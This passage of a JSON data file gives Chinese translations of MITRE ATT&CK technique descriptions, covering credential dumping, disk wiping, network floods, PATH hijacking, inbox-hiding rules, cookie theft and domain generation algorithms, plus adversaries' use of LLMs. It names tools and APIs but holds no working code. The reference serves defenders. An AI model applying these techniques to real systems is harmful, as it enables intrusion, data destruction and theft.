        "translated_description": "对手可能会购买有关受害者的技术信息，这些信息可以在目标过程中使用。有关受害者的信息可能会在信誉良好的私人来源和数据库中购买，例如订阅扫描数据库或其他数据聚合服务的付费订阅。对手还可能从信誉较差的来源（例如暗网或网络犯罪黑市）购买信息。\n\n对手可能会购买有关其已识别目标的信息，或使用购买的数据发现成功入侵的机会。威胁行为者可能会从购买的数据中收集各种技术细节，包括但不限于员工联系信息、凭据或有关受害者基础设施的具体信息。(引用: ZDNET Selling Data) 来自这些来源的信息可能会揭示其他形式的侦察机会（例如，[钓鱼获取信息](https://attack.mitre.org/techniques/T1598) 或 [搜索开放网站/域](https://attack.mitre.org/techniques/T1593)），建立操作资源（例如，[开发能力](https://attack.mitre.org/techniques/T1587) 或 [获取能力](https://attack.mitre.org/techniques/T1588)），和/或初始访问（例如，[外部远程服务](https://attack.mitre.org/techniques/T1133) 或 [有效帐户](https://attack.mitre.org/techniques/T1078)）。"
    },
    "OS Credential Dumping": {
        "translated_name": "操作系统凭证转储",
        "translated_description": "对手可能会尝试转储凭据以获取帐户登录和凭证材料，通常以哈希或明文密码的形式。凭据可以从操作系统缓存、内存或结构中获取。(引用: Brining MimiKatz to Unix) 然后可以使用凭据执行[横向移动](https://attack.mitre.org/tactics/TA0008)并访问受限信息。\n\n提到的相关子技术中的几种工具可能会被对手和专业安全测试人员使用。也可能存在其他自定义工具。\n"
    },
    "Shared Modules": {
        "translated_name": "共享模块",
        "translated_description": "对手可能通过加载共享模块来执行恶意有效负载。共享模块是加载到进程中的可执行文件，用于提供对可重用代码的访问，例如特定的自定义函数或调用操作系统API函数（即[本机API](https://attack.mitre.org/techniques/T1106)）。\n\n对手可能利用此功能作为在受害者系统上执行任意有效负载的一种方式。例如，对手可以将其恶意软件的功能模块化为执行各种功能的共享对象，例如管理C2网络通信或执行特定的目标操作。\n\nLinux和macOS模块加载器可以从任意本地路径加载和执行共享对象。此功能位于`dlfcn.h`中的函数如`dlopen`和`dlsym`。尽管macOS可以执行`.so`文件，但常见做法是使用`.dylib`文件。(引用: Apple Dev Dynamic Libraries)(引用: Linux Shared Libraries)(引用: RotaJakiro 2021 netlab360 analysis)(引用: Unit42 OceanLotus 2017)\n\nWindows模块加载器可以被指示从任意本地路径和任意通用命名约定（UNC）网络路径加载DLL。这种功能位于`NTDLL.dll`中，是Windows[本机API](https://attack.mitre.org/techniques/T1106)的一部分，通过运行时调用的函数如`LoadLibrary`。(引用: Microsoft DLL)"
    },
    "Data from Configuration Repository": {
        "translated_name": "来自配置库的数据",
        "translated_description": "对手可能从配置库中收集与管理设备相关的数据。配置库由管理系统使用，以配置、管理和控制远程系统上的数据。配置库还可以促进设备的远程访问和管理。\n\n对手可能会以收集大量敏感系统管理数据为目标。配置库中的数据可能通过各种协议和软件暴露，并且可以存储各种数据，其中许多可能与对手的发现目标一致。(引用: US-CERT-TA18-106A)(引用: US-CERT TA17-156A SNMP Abuse 2017)"
    },
    "Disk Structure Wipe": {
        "translated_name": "磁盘结构擦除",
        "translated_description": "对手可能会破坏或擦除硬盘上启动系统所需的磁盘数据结构；针对特定关键系统或网络中的大量系统，以中断系统和网络资源的可用性。\n\n对手可能会通过覆盖主引导记录（MBR）或分区表等结构中的关键数据，使系统无法启动。(引用: Symantec Shamoon 2012)(引用: FireEye Shamoon Nov 2016)(引用: Palo Alto Shamoon Nov 2016)(引用: Kaspersky StoneDrill 2017)(引用: Unit 42 Shamoon3 2018) 磁盘结构中包含的数据可能包括用于加载操作系统的初始可执行代码或磁盘上文件系统分区的位置。如果这些信息不存在，计算机将无法在启动过程中加载操作系统，从而使计算机不可用。[磁盘结构擦除](https://attack.mitre.org/techniques/T1561/002)可以单独执行，也可以与[磁盘内容擦除](https://attack.mitre.org/techniques/T1561/001)一起执行，如果擦除磁盘的所有扇区。\n\n在网络设备上，对手可能使用[网络设备CLI](https://attack.mitre.org/techniques/T1059/008)命令如`format`重新格式化文件系统。(引用: format_cmd_cisco)\n\n为了最大限度地影响目标组织，旨在破坏磁盘结构的恶意软件可能具有类似蠕虫的特性，通过利用其他技术如[有效帐户](https://attack.mitre.org/techniques/T1078)、[操作系统凭证转储](https://attack.mitre.org/techniques/T1003)和[SMB/Windows管理共享](https://attack.mitre.org/techniques/T1021/002)在网络中传播。(引用: Symantec Shamoon 2012)(引用: FireEye Shamoon Nov 2016)(引用: Palo Alto Shamoon Nov 2016)(引用: Kaspersky StoneDrill 2017)"
    },
    "Direct Network Flood": {
        "translated_name": "直接网络洪流",
        "translated_description": "对手可能通过直接向目标发送大量网络流量来尝试造成拒绝服务（DoS）。这种DoS攻击还可能减少目标系统和网络的可用性和功能。[直接网络洪流](https://attack.mitre.org/techniques/T1498/001)是指使用一个或多个系统向目标服务的网络发送大量网络数据包。几乎任何网络协议都可以用于洪流。无状态协议如UDP或ICMP常被使用，但有状态协议如TCP也可以使用。\n\n僵尸网络通常用于对网络和服务进行网络洪流攻击。大型僵尸网络可以从分布在全球互联网的系统生成大量流量。对手可能有资源建立和控制自己的僵尸网络基础设施，或者可能租用现有僵尸网络的时间进行攻击。在一些最严重的分布式DoS（DDoS）情况下，使用了如此多的系统来生成洪流，以至于每个系统只需发送少量流量即可产生足够的流量来饱和目标网络。在这种情况下，将DDoS流量与合法客户端区分开来变得极其困难。僵尸网络已被用于一些最引人注目的DDoS洪流攻击中，例如2012年针对美国主要银行的一系列事件。(引用: USNYAG IranianBotnet March 2016)"
    },
    "Path Interception by PATH Environment Variable": {
        "translated_name": "通过PATH环境变量进行路径拦截",
        "translated_description": "对手可能通过劫持用于加载库的环境变量来执行自己的恶意有效负载。PATH环境变量包含一个目录列表（用户和系统），操作系统按顺序搜索这些目录以查找从脚本或命令行调用的二进制文件。\n\n对手可以将恶意程序放置在PATH环境变量列表中较早的条目中，从而导致操作系统在按顺序搜索该PATH列表时执行恶意二进制文件而不是合法二进制文件。\n\n例如，在Windows上，如果对手将名为“net.exe”的恶意程序放置在`C:\\example path`中，该路径默认情况下优先于`C:\\Windows\\system32\\net.exe`在PATH环境变量中，当从命令行执行“net”时，将调用`C:\\example path`而不是系统的合法可执行文件`C:\\Windows\\system32\\net.exe`。某些执行程序的方法依赖于PATH环境变量来确定在未给出程序路径时要搜索的位置，例如从[命令和脚本解释器](https://attack.mitre.org/techniques/T1059)执行程序。(引用: ExpressVPN PATH env Windows 2021)\n\n对手还可以直接修改指定要搜索目录的$PATH变量。对手可以修改$PATH变量以指向他们有写访问权限的目录。当调用使用$PATH变量的程序时，操作系统将搜索指定目录并执行恶意二进制文件。在macOS上，这也可以通过修改$HOME变量来执行。这些变量可以使用命令行、launchctl、[Unix Shell配置修改](https://attack.mitre.org/techniques/T1546/004)或修改`/etc/paths.d`文件夹内容来修改。(引用: uptycs Fake POC linux malware 2023)(引用: nixCraft macOS PATH variables)(引用: Elastic Rules macOS launchctl 2022)"
    },
    "Sharepoint": {
        "translated_name": "Sharepoint",
        "translated_description": "对手可能利用SharePoint存储库作为挖掘有价值信息的来源。SharePoint通常包含有助于对手了解内部网络和系统结构和功能的有用信息。例如，以下是可能对对手有潜在价值的信息示例，并且可能在SharePoint上找到：\n\n* 政策、程序和标准\n* 物理/逻辑网络图\n* 系统架构图\n* 技术系统文档\n* 测试/开发凭据（即[不安全凭据](https://attack.mitre.org/techniques/T1552)）\n* 工作/项目时间表\n* 源代码片段\n* 指向网络共享和其他内部资源的链接\n"
    },
    "Direct Volume Access": {
        "translated_name": "直接卷访问",
        "translated_description": "对手可能直接访问卷以绕过文件访问控制和文件系统监控。Windows允许程序直接访问逻辑卷。具有直接访问权限的程序可以通过分析文件系统数据结构直接从驱动器读取和写入文件。此技术可能绕过Windows文件访问控制以及文件系统监控工具。(引用: Hakobyan 2009)\n\n存在执行这些操作的实用程序，例如`NinjaCopy`，可以在PowerShell中执行。(引用: Github PowerSploit Ninjacopy) 对手还可以使用内置或第三方实用程序（如`vssadmin`、`wbadmin`和[esentutl](https://attack.mitre.org/software/S0404)）从系统卷创建影子副本或备份数据。(引用: LOLBAS Esentutl)"
    },
    "Artificial Intelligence": {
        "translated_name": "人工智能",
        "translated_description": "对手可能获得生成性人工智能工具（如大型语言模型（LLM））的访问权限，以在目标过程中辅助各种技术。这些工具可以用于告知、增强和启用各种恶意任务，包括进行[侦察](https://attack.mitre.org/tactics/TA0043)、创建基本脚本、协助社会工程，甚至开发有效负载。(引用: MSFT-AI)\n\n例如，通过利用公开可用的LLM，对手实际上是在将某些任务外包或自动化给工具。使用AI，对手可以生成和生成各种书面语言的内容，用于[网络钓鱼](https://attack.mitre.org/techniques/T1566)/[钓鱼获取信息](https://attack.mitre.org/techniques/T1598)活动。相同的公开可用工具还可以进一步支持漏洞或其他攻击性研究，支持[开发能力](https://attack.mitre.org/techniques/T1587)。AI工具还可以通过生成、改进或以其他方式增强（例如，[混淆文件或信息](https://attack.mitre.org/techniques/T1027)）恶意脚本和有效负载来自动化技术任务。(引用: OpenAI-CTI)\n"
    },
    "Modify Cloud Resource Hierarchy": {
        "translated_name": "修改云资源层次结构",
        "translated_description": "对手可能会尝试修改基础设施即服务（IaaS）环境中的层次结构，以规避防御措施。\n\nIaaS环境通常将资源分组为层次结构，从而改进资源管理并将策略应用于相关组。不同的云提供商的层次结构不同。例如，在AWS环境中，可以将多个帐户分组到一个组织中，而在Azure环境中，可以将多个订阅分组到一个管理组中。(引用: AWS Organizations)(引用: Microsoft Azure Resources)\n\n对手可能会添加、删除或以其他方式修改IaaS层次结构中的资源组。例如，在Azure环境中，获得全局管理员帐户访问权限的对手可能会创建新的订阅以部署资源。他们还可能通过将现有的按需付费订阅从受害者租户转移到对手控制的租户来进行订阅劫持。这将允许对手使用受害者的计算资源，而不会在受害者租户上生成日志。(引用: Microsoft Peach Sandstorm 2023)(引用: Microsoft Subscription Hijacking 2022)\n\n在AWS环境中，具有适当权限的对手可以调用`LeaveOrganization` API，从而使帐户与其所属的AWS组织断开连接，并删除其前组织施加的任何服务控制策略、护栏或限制。或者，对手可以调用`CreateAccount` API，以便在AWS组织中创建一个新帐户。该帐户将使用注册到付款帐户的相同付款方式，但可能不受现有检测或服务控制策略的约束。(引用: AWS RE:Inforce Threat Detection 2024)"
    },
    "Email Hiding Rules": {
        "translated_name": "电子邮件隐藏规则",
        "translated_description": "对手可能会使用电子邮件规则来隐藏被入侵用户邮箱中的入站电子邮件。许多电子邮件客户端允许用户为各种电子邮件功能创建收件箱规则，包括将电子邮件移动到其他文件夹、将电子邮件标记为已读或删除电子邮件。可以在电子邮件客户端内或通过外部功能（如Windows系统上的<code>New-InboxRule</code>或<code>Set-InboxRule</code> [PowerShell](https://attack.mitre.org/techniques/T1059/001) cmdlet）创建或修改规则。(引用: Microsoft Inbox Rules)(引用: MacOS Email Rules)(引用: Microsoft New-InboxRule)(引用: Microsoft Set-InboxRule)\n\n对手可能会利用被入侵用户邮箱中的电子邮件规则来删除和/或移动电子邮件到不太显眼的文件夹。对手可能这样做是为了隐藏安全警报、C2通信或对从被入侵帐户发送的[内部鱼叉式网络钓鱼](https://attack.mitre.org/techniques/T1534)电子邮件的回复。\n\n组织内的任何用户或管理员（或具有有效凭据的对手）都可以创建规则以自动移动或删除电子邮件。这些规则可以被滥用以削弱/延迟检测，如果电子邮件内容被用户或防御者立即看到的话。恶意规则通常根据消息正文和主题行中的关键字（如<code>malware</code>、<code>suspicious</code>、<code>phish</code>和<code>hack</code>）过滤电子邮件。(引用: Microsoft Cloud App Security)\n\n在某些环境中，管理员可能能够启用在整个组织范围内而不是在单个收件箱上运行的电子邮件规则。例如，Microsoft Exchange支持传输规则，这些规则根据用户指定的条件评估组织接收的所有邮件，然后对符合这些条件的邮件执行用户指定的操作。(引用: Microsoft Mail Flow Rules 2023) 滥用此类功能的对手可能能够自动修改或删除与特定主题（如内部安全事件通知）相关的所有电子邮件。"
    },
    "External Defacement": {
        "translated_name": "外部篡改",
        "translated_description": "对手可能会篡改组织外部的系统，以试图传递信息、恐吓或误导组织或用户。[外部篡改](https://attack.mitre.org/techniques/T1491/002)可能最终导致用户不信任系统，并质疑/否定系统的完整性。外部网站是篡改的常见受害者；通常被对手和黑客组织攻击，以推动政治信息或传播宣传。(引用: FireEye Cyber Threats to Media Industries)(引用: Kevin Mandia Statement to US Senate Committee on Intelligence)(引用: Anonymous Hackers Deface Russian Govt Site) [外部篡改](https://attack.mitre.org/techniques/T1491/002)可能被用作触发事件的催化剂，或作为对组织或政府采取行动的回应。同样，网站篡改也可能被用作未来攻击的准备或前兆，例如[驱动器式攻击](https://attack.mitre.org/techniques/T1189)。(引用: Trend Micro Deep Dive Into Defacement)"
    },
    "Encrypted/Encoded File": {
        "translated_name": "加密/编码文件",
        "translated_description": "对手可能会加密或编码文件，以混淆字符串、字节和其他特定模式，从而阻碍检测。加密和/或编码文件内容旨在隐藏入侵中使用的恶意工件。许多其他技术，如[软件打包](https://attack.mitre.org/techniques/T1027/002)、[隐写术](https://attack.mitre.org/techniques/T1027/003)和[嵌入式有效负载](https://attack.mitre.org/techniques/T1027/009)，也有相同的广泛目标。加密和/或编码文件可能导致静态签名检测的失效，只有在执行/使用时（即[解混淆/解码文件或信息](https://attack.mitre.org/techniques/T1140)）才会揭示这些恶意内容。\n\n这种类型的文件混淆可以应用于受害者主机上的许多文件工件，如恶意软件日志/配置和有效负载文件。(引用: File obfuscation) 文件可以使用硬编码或用户提供的密钥进行加密，也可以使用标准编码/压缩方案（如Base64）进行混淆。\n\n可以对文件的整个内容进行混淆，也可以只对特定功能或值（如C2地址）进行混淆。加密和编码也可以应用于冗余层以提供额外保护。\n\n例如，对手可能会滥用密码保护的Word文档或自解压（SFX）归档文件，作为加密/编码文件（如[网络钓鱼](https://attack.mitre.org/techniques/T1566)有效负载）的方法。这些文件通常通过将预期的归档内容附加到解压缩存根来工作，当文件被调用时执行（例如[用户执行](https://attack.mitre.org/techniques/T1204)）。(引用: SFX - Encrypted/Encoded File)\n\n对手还可能滥用特定文件的编码方案以及自定义编码方案。例如，可以滥用文本文件中的字节顺序标记（BOM）头来操纵和混淆文件内容，直到[命令和脚本解释器](https://attack.mitre.org/techniques/T1059)执行。"
    },
    "IP Addresses": {
        "translated_name": "IP地址",
        "translated_description": "对手可能会收集受害者的IP地址，以便在目标过程中使用。公共IP地址可能按块分配给组织，或按一系列连续地址分配。有关分配的IP地址的信息可能包括各种详细信息，例如哪些IP地址正在使用中。IP地址还可以使对手推断出有关受害者的其他详细信息，例如组织规模、物理位置、互联网服务提供商以及其公开基础设施的托管位置。\n\n对手可能通过各种方式收集这些信息，例如通过[主动扫描](https://attack.mitre.org/techniques/T1595)或[钓鱼获取信息](https://attack.mitre.org/techniques/T1598)进行直接收集。有关分配的IP地址的信息也可能通过在线或其他可访问的数据集（例如[搜索开放技术数据库](https://attack.mitre.org/techniques/T1596)）暴露给对手。(引用: WHOIS)(引用: DNS Dumpster)(引用: Circl Passive DNS) 收集这些信息可能会揭示其他形式的侦察机会（例如[主动扫描](https://attack.mitre.org/techniques/T1595)或[搜索开放网站/域](https://attack.mitre.org/techniques/T1593)），建立操作资源（例如[获取基础设施](https://attack.mitre.org/techniques/T1583)或[妥协基础设施](https://attack.mitre.org/techniques/T1584)），和/或初始访问（例如[外部远程服务](https://attack.mitre.org/techniques/T1133)）。"
    },
    "OS Exhaustion Flood": {
        "translated_name": "操作系统耗尽洪流",
        "translated_description": "对手可能会发起针对端点操作系统（OS）的拒绝服务（DoS）攻击。系统的操作系统负责管理有限的资源，并防止系统因对其容量的过度需求而不堪重负。这些攻击不需要耗尽系统上的实际资源；攻击可能只是耗尽操作系统自我施加的限制和可用资源。\n\n实现这一目标的不同方法包括TCP状态耗尽攻击，如SYN洪流和ACK洪流。(引用: Arbor AnnualDoSreport Jan 2018) 在SYN洪流中，会发送大量SYN数据包，但从未完成三次握手。由于每个操作系统允许的并发TCP连接数是有限的，这可能很快耗尽系统接收新TCP连接请求的能力，从而阻止对服务器提供的任何TCP服务的访问。(引用: Cloudflare SynFlood)\n\nACK洪流利用了TCP协议的有状态特性。向目标发送大量ACK数据包。这迫使操作系统在其状态表中搜索已建立的相关TCP连接。由于ACK数据包是针对不存在的连接的，操作系统将不得不搜索整个状态表以确认没有匹配项。当需要对大量数据包进行此操作时，计算要求可能导致服务器变得迟缓和/或无响应，因为它必须进行大量工作以消除恶意ACK数据包。这大大减少了提供目标服务的可用资源。(引用: Corero SYN-ACKflood)"
    },
    "Rootkit": {
        "translated_name": "Rootkit",
        "translated_description": "对手可能会使用rootkit来隐藏程序、文件、网络连接、服务、驱动程序和其他系统组件的存在。Rootkit是通过拦截/挂钩和修改操作系统API调用来隐藏恶意软件存在的程序。(引用: Symantec Windows Rootkits)\n\nRootkit或启用rootkit的功能可能驻留在操作系统的用户级别或内核级别，甚至更低，包括虚拟机监控程序、主引导记录或[系统固件](https://attack.mitre.org/techniques/T1542/001)。(引用: Wikipedia Rootkit) 已经发现了适用于Windows、Linux和Mac OS X系统的rootkit。(引用: CrowdStrike Linux Rootkit)(引用: BlackHat Mac OSX Rootkit)"
    },
    "PowerShell Profile": {
        "translated_name": "PowerShell 配置文件",
        "translated_description": "对手可能通过执行由 PowerShell 配置文件触发的恶意内容来获得持久性和提升权限。PowerShell 配置文件 (<code>profile.ps1</code>) 是一个在 [PowerShell](https://attack.mitre.org/techniques/T1059/001) 启动时运行的脚本，可以用作登录脚本来自定义用户环境。\n\n[PowerShell](https://attack.mitre.org/techniques/T1059/001) 支持根据用户或主机程序的不同而有多个配置文件。例如，不同的 PowerShell 主机程序（如 PowerShell 控制台、PowerShell ISE 或 Visual Studio Code）可以有不同的配置文件。管理员还可以配置一个适用于本地计算机上所有用户和主机程序的配置文件。(引用: Microsoft About Profiles) \n\n对手可能会修改这些配置文件以包含任意命令、函数、模块和/或 [PowerShell](https://attack.mitre.org/techniques/T1059/001) 驱动器以获得持久性。每次用户打开 [PowerShell](https://attack.mitre.org/techniques/T1059/001) 会话时，修改后的脚本将被执行，除非在启动时使用 <code>-NoProfile</code> 标志。(引用: ESET Turla PowerShell May 2019) \n\n如果具有更高权限的帐户（如域管理员）加载并执行 PowerShell 配置文件中的脚本，对手还可能能够提升权限。(引用: Wits End and Shady PowerShell Profiles)"
    },
    "JavaScript": {
        "translated_name": "JavaScript",
        "translated_description": "对手可能会滥用各种 JavaScript 实现来执行。JavaScript (JS) 是一种平台无关的脚本语言（在运行时即时编译），通常与网页中的脚本相关，但 JS 也可以在浏览器外的运行时环境中执行。(引用: NodeJS)\n\nJScript 是相同脚本标准的 Microsoft 实现。JScript 通过 Windows 脚本引擎解释，因此与 Windows 的许多组件集成，如 [Component Object Model](https://attack.mitre.org/techniques/T1559/001) 和 Internet Explorer HTML 应用程序 (HTA) 页面。(引用: JScrip May 2018)(引用: Microsoft JScript 2007)(引用: Microsoft Windows Scripts)\n\nJavaScript for Automation (JXA) 是基于 JavaScript 的 macOS 脚本语言，是 Apple 的开放脚本架构 (OSA) 的一部分，在 OSX 10.10 中引入。Apple 的 OSA 提供了控制应用程序、与操作系统接口以及访问 Apple 内部 API 的脚本功能。从 OSX 10.10 开始，OSA 仅支持两种语言，JXA 和 [AppleScript](https://attack.mitre.org/techniques/T1059/002)。脚本可以通过命令行实用程序 <code>osascript</code> 执行，可以通过 <code>osacompile</code> 编译成应用程序或脚本文件，并且可以通过 OSAKit 框架在其他程序的内存中编译和执行。(引用: Apple About Mac Scripting 2016)(引用: SpecterOps JXA 2020)(引用: SentinelOne macOS Red Team)(引用: Red Canary Silver Sparrow Feb2021)(引用: MDSec macOS JXA and VSCode)\n\n对手可能会滥用各种 JavaScript 实现来执行各种行为。常见的用途包括在网站上托管恶意脚本作为 [Drive-by Compromise](https://attack.mitre.org/techniques/T1189) 的一部分，或下载并执行这些脚本文件作为二级有效负载。由于这些有效负载是基于文本的，对手也很常见地将其内容混淆作为 [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027) 的一部分。"
    },
    "DNS": {
        "translated_name": "DNS",
        "translated_description": "对手可能会使用域名系统 (DNS) 应用层协议进行通信，以通过与现有流量混合来避免检测/网络过滤。发送到远程系统的命令以及这些命令的结果通常会嵌入在客户端和服务器之间的协议流量中。\n\nDNS 协议在计算机网络中执行管理功能，因此在环境中可能非常常见。即使在网络身份验证完成之前，也可能允许 DNS 流量。DNS 数据包包含许多字段和标头，可以隐藏数据。通常称为 DNS 隧道，对手可能会滥用 DNS 与他们控制的系统在受害者网络内进行通信，同时模仿正常、预期的流量。(引用: PAN DNS Tunneling)(引用: Medium DnsTunneling)"
    },
    "Lifecycle-Triggered Deletion": {
        "translated_name": "生命周期触发删除",
        "translated_description": "对手可能会修改云存储桶的生命周期策略以销毁其中存储的所有对象。\n\n云存储桶通常允许用户设置生命周期策略，以在设定的时间段后自动迁移、归档或删除对象。(引用: AWS Storage Lifecycles)(引用: GCP Storage Lifecycles)(引用: Azure Storage Lifecycles) 如果威胁行为者具有修改这些策略的足够权限，他们可能能够一次性删除所有对象。\n\n例如，在 AWS 环境中，具有 `PutLifecycleConfiguration` 权限的对手可以使用 `PutBucketLifecycle` API 调用将生命周期策略应用于 S3 存储桶，该策略会在一天后删除存储桶中的所有对象。(引用: Palo Alto Cloud Ransomware) 除了为了勒索和 [Financial Theft](https://attack.mitre.org/techniques/T1657) 目的销毁数据外，对手还可能对存储云日志的存储桶执行此操作以进行 [Indicator Removal](https://attack.mitre.org/techniques/T1070)。(引用: Datadog S3 Lifecycle CloudTrail Logs)"
    },
    "Audio Capture": {
        "translated_name": "音频捕获",
        "translated_description": "对手可以利用计算机的外围设备（例如麦克风和网络摄像头）或应用程序（例如语音和视频通话服务）捕获音频录音，以监听敏感对话以收集信息。(引用: ESET Attor Oct 2019)\n\n恶意软件或脚本可能会通过操作系统或应用程序提供的可用 API 与设备交互以捕获音频。音频文件可能会写入磁盘并在稍后进行外传。"
    },
    "Create or Modify System Process": {
        "translated_name": "创建或修改系统进程",
        "translated_description": "对手可能会创建或修改系统级进程以重复执行恶意有效负载作为持久性的一部分。当操作系统启动时，它们可以启动执行后台系统功能的进程。在 Windows 和 Linux 上，这些系统进程称为服务。(引用: TechNet Services) 在 macOS 上，称为 [Launch Daemon](https://attack.mitre.org/techniques/T1543/004) 和 [Launch Agent](https://attack.mitre.org/techniques/T1543/001) 的 launchd 进程用于完成系统初始化并加载用户特定参数。(引用: AppleDocs Launch Agent Daemons)\n\n对手可能会安装新的服务、守护进程或代理，这些可以配置为在启动时或在可重复的时间间隔执行，以建立持久性。同样，对手可能会修改现有的服务、守护进程或代理以实现相同的效果。\n\n服务、守护进程或代理可能会以管理员权限创建，但以 root/SYSTEM 权限执行。对手可能会利用此功能创建或修改系统进程以提升权限。(引用: OSX Malware Detection)"
    },
    "External Remote Services": {
        "translated_name": "外部远程服务",
        "translated_description": "对手可能会利用外部远程服务来初始访问和/或在网络中保持持久性。远程服务如 VPN、Citrix 和其他访问机制允许用户从外部位置连接到内部企业网络资源。通常有远程服务网关来管理这些服务的连接和凭据认证。服务如 [Windows Remote Management](https://attack.mitre.org/techniques/T1021/006) 和 [VNC](https://attack.mitre.org/techniques/T1021/005) 也可以外部使用。(引用: MacOS VNC software for Remote Desktop)\n\n使用服务的 [Valid Accounts](https://attack.mitre.org/techniques/T1078) 通常是一个要求，这些凭据可以通过凭据钓鱼或在入侵企业网络后从用户那里获取。(引用: Volexity Virtual Private Keylogging) 访问远程服务可以作为操作期间的冗余或持久访问机制。\n\n也可以通过不需要认证的暴露服务获得访问。在容器化环境中，这可能包括暴露的 Docker API、Kubernetes API 服务器、kubelet 或 Web 应用程序如 Kubernetes 仪表板。(引用: Trend Micro Exposed Docker Server)(引用: Unit 42 Hildegard Malware)"
    },
    "LC_LOAD_DYLIB Addition": {
        "translated_name": "LC_LOAD_DYLIB 添加",
        "translated_description": "对手可能通过执行受污染二进制文件触发的恶意内容来建立持久性。Mach-O 二进制文件有一系列头文件，用于在加载二进制文件时执行某些操作。Mach-O 二进制文件中的 LC_LOAD_DYLIB 头告诉 macOS 和 OS X 在执行时加载哪些动态库 (dylibs)。只要对其余字段和依赖项进行调整，这些可以随时添加到已编译的二进制文件中。(引用: Writing Bad Malware for OSX) 有工具可用于执行这些更改。\n\n对手可能会修改 Mach-O 二进制文件头以在每次执行二进制文件时加载和执行恶意 dylibs。虽然任何更改都会使二进制文件上的数字签名失效，因为二进制文件正在被修改，但这可以通过简单地从二进制文件中删除 LC_CODE_SIGNATURE 命令来解决，以便在加载时不检查签名。(引用: Malware Persistence on OS X)"
    },
    "Steal Web Session Cookie": {
        "translated_name": "窃取 Web 会话 Cookie",
        "translated_description": "对手可能会窃取 Web 应用程序或服务会话 Cookie 并使用它们以经过身份验证的用户身份访问 Web 应用程序或互联网服务，而无需凭据。Web 应用程序和服务通常使用会话 Cookie 作为用户登录网站后的身份验证令牌。\n\n即使 Web 应用程序未被主动使用，Cookie 通常也会在较长时间内有效。Cookie 可以在磁盘上、浏览器的进程内存中以及到远程系统的网络流量中找到。此外，目标机器上的其他应用程序可能会在内存中存储敏感的身份验证 Cookie（例如，认证到云服务的应用程序）。会话 Cookie 可以用来绕过一些多因素身份验证协议。(引用: Pass The Cookie)\n\n有几个例子表明恶意软件针对本地系统上的 Web 浏览器中的 Cookie。(引用: Kaspersky TajMahal April 2019)(引用: Unit 42 Mac Crypto Cookies January 2019) 对手还可能通过在网站中注入恶意 JavaScript 内容或依赖 [User Execution](https://attack.mitre.org/techniques/T1204) 通过诱骗受害者在其浏览器中运行恶意 JavaScript 来窃取 Cookie。(引用: Talos Roblox Scam 2023)(引用: Krebs Discord Bookmarks 2023)\n\n还有一些开源框架如 `Evilginx2` 和 `Muraena` 可以通过恶意代理（例如 [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557)）收集会话 Cookie，这些代理可以由对手设置并用于钓鱼活动。(引用: Github evilginx2)(引用: GitHub Mauraena)\n\n在对手获取有效的 Cookie 后，他们可以执行 [Web Session Cookie](https://attack.mitre.org/techniques/T1550/004) 技术登录到相应的 Web 应用程序。"
    },
    "Container Orchestration Job": {
        "translated_name": "容器编排任务",
        "translated_description": "对手可能会滥用容器编排工具（如 Kubernetes）提供的任务调度功能，来调度部署配置为执行恶意代码的容器。容器编排任务会在特定日期和时间运行这些自动化任务，类似于 Linux 系统上的 cron 任务。这种类型的部署还可以配置为随着时间的推移维护一定数量的容器，从而自动化在集群中保持持久性的过程。\n\n在 Kubernetes 中，可以使用 CronJob 来调度运行一个或多个容器以执行特定任务的 Job。(引用: Kubernetes Jobs)(引用: Kubernetes CronJob) 因此，对手可能会利用 CronJob 来调度部署在集群内各个节点上执行恶意代码的 Job。(引用: Threat Matrix for Kubernetes)"
    },
    "Domain Generation Algorithms": {
        "translated_name": "域名生成算法",
        "translated_description": "对手可能会使用域名生成算法（DGA）来动态识别命令和控制流量的目标域，而不是依赖于静态 IP 地址或域名列表。这具有使防御者更难阻止、跟踪或接管命令和控制通道的优势，因为恶意软件可能会检查成千上万个域名以获取指令。(引用: Cybereason Dissecting DGAs)(引用: Cisco Umbrella DGA)(引用: Unit 42 DGA Feb 2019)\n\nDGA 可以采用生成每个字母时看似随机或“无意义”的字符串（例如：istgmxdejdnxuyla.ru）的形式。或者，一些 DGA 使用整个单词作为单位，通过将单词连接在一起而不是字母（例如：cityjulydish.net）。许多 DGA 是基于时间的，为每个时间段（每小时、每天、每月等）生成不同的域名。其他 DGA 还结合种子值，使防御者更难预测未来的域名。(引用: Cybereason Dissecting DGAs)(引用: Cisco Umbrella DGA)(引用: Talos CCleanup 2017)(引用: Akamai DGA Mitigation)\n\n对手可能会使用 DGA 作为[备用通道](https://attack.mitre.org/techniques/T1008)的目的。当与主命令和控制服务器失去联系时，恶意软件可能会使用 DGA 作为重新建立命令和控制的一种手段。(引用: Talos CCleanup 2017)(引用: FireEye POSHSPY April 2017)(引用: ESET Sednit 2017 Activity)"
    },
    "Double File Extension": {
        "translated_name": "双重文件扩展名",
        "translated_description": "对手可能会滥用文件名中的双重扩展名作为伪装真实文件类型的一种手段。文件名可能包含一个次要文件类型扩展名，这可能导致只显示第一个扩展名（例如：<code>File.txt.exe</code> 在某些视图中可能仅显示为 <code>File.txt</code>）。然而，第二个扩展名是真实的文件类型，决定了文件的打开和执行方式。操作系统在文件浏览器（例如：explorer.exe）中可能会隐藏真实的文件扩展名，以及在使用或类似于系统策略配置的任何软件中。(引用: PCMag DoubleExtension)(引用: SOCPrime DoubleExtension)\n\n对手可能会滥用双重扩展名来试图隐藏有效负载的危险文件类型。一个非常常见的用法是诱骗用户打开他们认为是无害文件类型但实际上是可执行代码的文件。这类文件通常作为电子邮件附件出现，并允许对手通过[鱼叉式网络钓鱼附件](https://attack.mitre.org/techniques/T1566/001)和[用户执行](https://attack.mitre.org/techniques/T1204)获得对用户系统的[初始访问](https://attack.mitre.org/tactics/TA0001)。例如，名为 <code>Evil.txt.exe</code> 的可执行文件附件可能显示为 <code>Evil.txt</code>。用户可能会将其视为无害的文本文件并打开它，从而无意中执行隐藏的恶意软件。(引用: SOCPrime DoubleExtension)\n\n常见的文件类型，如文本文件（.txt、.doc 等）和图像文件（.jpg、.gif 等）通常用作第一个扩展名以显得无害。通常被视为危险的可执行扩展名，如 .exe、.lnk、.hta 和 .scr，通常作为第二个扩展名和真实文件类型出现。"
    },
    "Bypass User Account Control": {
        "translated_name": "绕过用户帐户控制",
